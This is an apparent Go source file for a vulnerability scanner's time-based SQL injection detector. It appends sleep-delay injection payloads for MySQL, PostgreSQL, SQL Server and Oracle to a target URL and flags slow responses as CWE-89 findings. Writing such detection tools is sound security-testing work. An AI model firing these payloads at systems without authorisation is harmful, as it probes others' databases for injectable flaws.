package detection

import (
	"context"
	"net/http"
	"time"

	"github.com/autonomouspen/scanner/internal/common"
)

type TimeBased struct{}

func (t *TimeBased) Detect(target string, ctx context.Context) ([]common.Finding, error) {
	var findings []common.Finding

	payloads := map[string]string{
		"MySQL":      "' AND SLEEP(5) --",
		"PostgreSQL": "' AND pg_sleep(5) --",
		"Microsoft SQL Server": "' WAITFOR DELAY '0:0:5' --",
		"Oracle":     "' AND dbms_pipe.receive_message(('a'),5) --",
	}

	for dbms, payload := range payloads {
		startTime := time.Now()
		_, err := http.Get(target + payload)
		if err != nil {
			continue
		}
		elapsedTime := time.Since(startTime)

		if elapsedTime > 5*time.Second {
			findings = append(findings, common.Finding{
				Type:       "Time-based SQLi",
				Severity:   "High",
				URL:        target + payload,
				Evidence:   "Response took longer than 5 seconds.",
				Confidence: "High",
				CWE:        "CWE-89",
				CVSS:       8.8,
				DBMS:       dbms,
			})
		}
	}

	return findings, nil
}
